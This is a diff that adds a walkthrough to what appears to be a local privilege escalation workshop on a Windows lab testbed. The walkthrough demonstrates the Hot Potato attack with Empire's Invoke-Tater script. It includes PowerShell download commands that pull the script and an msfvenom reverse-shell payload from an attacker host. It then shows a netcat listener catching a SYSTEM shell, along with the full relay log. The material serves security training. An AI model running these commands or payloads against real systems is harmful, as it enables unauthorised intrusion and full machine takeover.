@@ -910,3 +910,111 @@ LPETestbed
 
 C:\Windows\system32>
 ````
+### Let's talk about Hot Potato ###
+
+Hot potato is a vulnerability that deals with local spoofing of NBNS and WPAD.
+
+There is a more complete explanation here: https://foxglovesecurity.com/2016/01/16/hot-potato/
+
+So we want to get a new reverse shell as NT\Authority SYSTEM.
+
+We are going to use the Invoke-Tater.ps1 powershell script that comes with Empire: https://github.com/BC-SECURITY/Empire
+
+We copy that file locally into our LPE directory.
+
+````
+root@kali:~/LPEWorkshop# cp /root/Tools/Empire/data/module_source/privesc/Invoke-Tater.ps1 .
+root@kali:~/LPEWorkshop# 
+````
+
+Then we transfer that file to our victim machine:
+
+````
+PS C:\Users\user\Downloads> IEX (New-Object Net.WebClient).DownloadFile('http://YOURIPHERE/Invoke-Tater.ps1', 'C:\Users\user\Downloads\Invoke-Tater.ps1')
+PS C:\Users\user\Downloads> 
+````
+
+Now we import that module so that we can invoke the script:
+
+````
+PS C:\Users\user\Downloads> Import-Module C:\Users\user\Downloads\Invoke-Tater.ps1
+````
+
+Because my online Powershell encoder is currently down, we will have the exploit execute an msfvenom payload to give us a new reverse shell.
+
+````
+root@kali:~/LPEWorkshop# msfvenom -p windows/shell_reverse_tcp LPORT=1337 LHOST=YOURIPHERE -f exe > potato.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+root@kali:~/LPEWorkshop# 
+````
+Now we transfer the file to the victim.
+
+````
+PS C:\Users\user> IEX (New-Object Net.WebClient).DownloadFile('http://10.22.6.122/potato.exe', 'C:\Users\user\Downloads\potato.exe')
+````
+
+Then we invoke the command so that we can get elevation:
+````
+PS C:\Users\user\Downloads> Invoke-Tater -Trigger 1 -Command "C:\Users\user\Downloads\potato.exe"
+````
+And then in short order we get our reverse shell as NT\System:
+
+````
+root@kali:~/LPEWorkshop# nc -lvnp 1337
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::1337
+Ncat: Listening on 0.0.0.0:1337
+Ncat: Connection from 10.22.6.43.
+Ncat: Connection from 10.22.6.43:52753.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
+````
+
+And we see in our terminal the steps that were taken:
+````
+PS C:\Users\user\Downloads> Invoke-Tater -Trigger 1 -Command "C:\Users\user\Downloads\potato.exe"
+2020-01-08T12:08:26 - Tater (Hot Potato Privilege Escalation) started
+Local IP Address = 10.22.6.43
+Spoofing Hostname = WPAD
+Windows Defender Trigger Enabled
+Real Time Console Output Enabled
+Run Stop-Tater to stop Tater early
+Use Get-Command -Noun Tater* to show available functions
+Press any key to stop real time console output
+
+2020-01-08T12:08:26 - Waiting for incoming HTTP connection
+2020-01-08T12:08:26 - Flushing DNS resolver cache
+2020-01-08T12:08:27 - Starting NBNS spoofer to resolve WPAD to 127.0.0.1
+2020-01-08T12:08:35 - WPAD has been spoofed to 127.0.0.1
+2020-01-08T12:08:35 - Running Windows Defender signature update
+2020-01-08T12:08:37 - HTTP request for /wpad.dat received from 127.0.0.1
+2020-01-08T12:08:41 - Attempting to redirect to http://localhost:80/gethashes and trigger relay
+2020-01-08T12:08:41 - HTTP request for http://ds.download.windowsupdate.com/v11/2/windowsupdate/redir/v6-win7sp1-wuredir.cab?2001081908 received from 127.0.0.1
+2020-01-08T12:08:45 - HTTP request for /GETHASHES received from 127.0.0.1
+2020-01-08T12:08:46 - HTTP to SMB relay triggered by 127.0.0.1
+2020-01-08T12:08:46 - Grabbing challenge for relay from 127.0.0.1
+2020-01-08T12:08:46 - Received challenge 13B7858E7D232D4F for relay from 127.0.0.1
+2020-01-08T12:08:46 - Providing challenge 13B7858E7D232D4F for relay to 127.0.0.1
+2020-01-08T12:08:47 - Sending response for \ for relay to 127.0.0.1
+2020-01-08T12:08:47 - HTTP to SMB relay authentication successful for \ on 127.0.0.1
+2020-01-08T12:08:47 - SMB relay service GCAOIDVEOABQUCYYKJRT created on 127.0.0.1
+2020-01-08T12:09:17 - Command likely executed on 127.0.0.1
+2020-01-08T12:09:17 - SMB relay service GCAOIDVEOABQUCYYKJRT deleted on 127.0.0.1
+2020-01-08T12:09:18 - Stopping HTTP listener
+2020-01-08T12:09:21 - Tater was successful and has exited
+PS C:\Users\user\Downloads> 
+````
+
+Let's talk through some of the steps here:
+
+We setup a local spoofer for WPAD, then we trigger the vulnerability by asking Defender to check for updates. Because Defender is running as NT\SYSTEM we can get a hash to relay to our own SMB server. Once we relay this to our local SMB server we can then execute a command.
